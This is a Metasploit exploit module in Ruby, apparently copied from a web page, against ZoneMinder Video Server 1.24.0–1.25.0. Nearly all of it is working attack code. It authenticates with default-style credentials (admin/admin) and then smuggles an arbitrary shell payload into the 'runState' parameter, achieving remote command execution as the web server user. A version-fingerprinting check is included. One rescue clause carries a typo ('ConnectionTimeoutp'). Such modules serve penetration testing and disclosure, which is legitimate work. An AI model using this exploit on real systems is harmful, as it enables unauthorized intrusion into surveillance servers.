# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => &#039;ZoneMinder Video Server packageControl Command Execution&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a command execution vulnerability in ZoneMinder Video
                Server version 1.24.0 to 1.25.0 which could be abused to allow
                authenticated users to execute arbitrary commands under the context of the
                web server user. The &#039;packageControl&#039; function in the
                &#039;includes/actions.php&#039; file calls &#039;exec()&#039; with user controlled data
                from the &#039;runState&#039; parameter.
            },
            &#039;References&#039;     =>
                [
                    [&#039;URL&#039;, &#039;http://itsecuritysolutions.org/2013-01-22-ZoneMinder-Video-Server-arbitrary-command-execution-vulnerability/&#039;],
                ],
            &#039;Author&#039;         =>
                [
                    &#039;Brendan Coles <bcoles[at]gmail.com>&#039;, # Discovery and exploit
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Privileged&#039;     => true,
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Platform&#039;       => &#039;unix&#039;,
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039;    => "\x00",
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                            &#039;RequiredCmd&#039; => &#039;generic telnet python perl bash&#039;,
                        },
                },
            &#039;Targets&#039;        =>
                [
                    [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }]
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => "Jan 22 2013",
        ))
 
        register_options([
            OptString.new(&#039;USERNAME&#039;,  [true, &#039;The ZoneMinder username&#039;, &#039;admin&#039;]),
            OptString.new(&#039;PASSWORD&#039;,  [true, &#039;The ZoneMinder password&#039;, &#039;admin&#039;]),
            OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the web application&#039;, &#039;/zm/&#039;])
        ], self.class)
    end
 
    def check
 
        peer    = "#{rhost}:#{rport}"
        base    = target_uri.path
        base    << &#039;/&#039; if base[-1, 1] != &#039;/&#039;
        user    = datastore[&#039;USERNAME&#039;]
        pass    = datastore[&#039;PASSWORD&#039;]
        cookie  = "ZMSESSID=" + rand_text_alphanumeric(rand(10)+6)
        data    = "action=login&view=version&username=#{user}&password=#{pass}"
 
        # login and retrieve software version
        print_status("#{peer} - Authenticating as user &#039;#{user}&#039;")
        begin
            res = send_request_cgi({
                &#039;method&#039; => &#039;POST&#039;,
                &#039;uri&#039;    => "#{base}index.php",
                &#039;cookie&#039; => "#{cookie}",
                &#039;data&#039;   => "#{data}",
            })
            if res and res.code == 200
                if res.body =~ /<title>ZM - Login<\/title>/
                    print_error("#{peer} - Authentication failed")
                    return Exploit::CheckCode::Unknown
                elsif res.body =~ /v1.2(4\.\d+|5\.0)/
                    return Exploit::CheckCode::Appears
                elsif res.body =~ /<title>ZM/
                    return Exploit::CheckCode::Detected
                end
            end
            return Exploit::CheckCode::Safe
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeoutp
            print_error("#{peer} - Connection failed")
        end
        return Exploit::CheckCode::Unknown
 
    end
 
    def exploit
 
        @peer    = "#{rhost}:#{rport}"
        base     = target_uri.path
        base    << &#039;/&#039; if base[-1, 1] != &#039;/&#039;
        cookie   = "ZMSESSID=" + rand_text_alphanumeric(rand(10)+6)
        user     = datastore[&#039;USERNAME&#039;]
        pass     = datastore[&#039;PASSWORD&#039;]
        data     = "action=login&view=postlogin&username=#{user}&password=#{pass}"
        command  = Rex::Text.uri_encode(payload.encoded)
 
        # login
        print_status("#{@peer} - Authenticating as user &#039;#{user}&#039;")
        begin
            res = send_request_cgi({
                &#039;method&#039; => &#039;POST&#039;,
                &#039;uri&#039;    => "#{base}index.php",
                &#039;cookie&#039; => "#{cookie}",
                &#039;data&#039;   => "#{data}",
            })
            if !res or res.code != 200 or res.body =~ /<title>ZM - Login<\/title>/
                fail_with(Exploit::Failure::NoAccess, "#{@peer} - Authentication failed")
            end
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
        end
        print_good("#{@peer} - Authenticated successfully")
 
        # send payload
        print_status("#{@peer} - Sending payload (#{command.length} bytes)")
        begin
            res = send_request_cgi({
                &#039;method&#039;    => &#039;POST&#039;,
                &#039;uri&#039;       => "#{base}index.php",
                &#039;data&#039;      => "view=none&action=state&runState=start;#{command}%26",
                &#039;cookie&#039;    => "#{cookie}"
            })
            if res and res.code == 200
                print_good("#{@peer} - Payload sent successfully")
            else
                fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Sending payload failed")
            end
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
        end
 
    end
 
end

